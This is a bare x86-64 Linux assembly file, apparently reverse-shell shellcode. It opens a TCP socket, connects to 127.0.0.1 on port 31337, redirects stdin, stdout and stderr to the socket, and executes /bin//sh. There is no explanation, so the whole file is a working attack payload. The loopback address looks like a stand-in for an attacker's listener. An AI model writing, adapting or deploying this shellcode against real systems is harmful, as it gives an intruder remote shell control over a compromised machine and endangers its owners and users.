BITS 64

section .text
global _start

_start:
    xor rax, rax
    mov al, 41            
    xor rdi, rdi
    mov dil, 2            
    xor rsi, rsi
    mov sil, 1            
    xor rdx, rdx         
    syscall

    mov rdi, rax

    mov rsi, rsp
    sub rsp, 16
    mov word [rsp], 2             
    mov word [rsp+2], 0x697a      
    mov dword [rsp+4], 0x0100007f ; 127.0.0.1
    mov rdx, 16                   
    mov rsi, rsp                  
    mov rax, 42                  
    syscall

    mov rsi, 0
.nextdup:
    mov rax, 33                   
    syscall
    inc rsi
    cmp rsi, 3
    jne .nextdup

    xor rax, rax
    mov rbx, 0x68732f2f6e69622f   
    push rax                      
    push rbx
    mov rdi, rsp                  
    xor rsi, rsi                
    xor rdx, rdx                  
    mov al, 59                    
    syscall
